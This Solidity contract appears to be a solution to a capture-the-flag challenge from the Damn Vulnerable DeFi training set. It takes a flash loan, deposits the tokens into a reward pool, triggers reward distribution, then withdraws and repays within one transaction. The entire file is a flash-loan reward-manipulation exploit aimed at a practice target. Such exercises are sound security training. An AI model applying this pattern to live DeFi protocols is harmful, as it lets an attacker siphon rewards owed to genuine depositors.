// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
import "hardhat/console.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract ReceiveFlashLoan {
    using Address for address;
    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public theRewarderPool;
    DamnValuableToken public liquidityToken;

    constructor(address _flashLoanerPool, address _theRewarderPool, address _liquidityToken) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
    }

    function executeFlashLoan(uint256 amount) external {
        // Initiate flash loan from the pool
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        // Check if the sender is the flash loan pool
        require(msg.sender == address(flashLoanerPool), "Only the flash loan pool can call this function");

        // Approve TheRewarderPool to spend tokens
        liquidityToken.approve(address(theRewarderPool), amount);

        // Deposit tokens into TheRewarderPool
        theRewarderPool.deposit(amount);

        // Get rewards
        theRewarderPool.distributeRewards();

        // Withdraw deposit
        theRewarderPool.withdraw(amount);

        // Pay back the flash loan
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
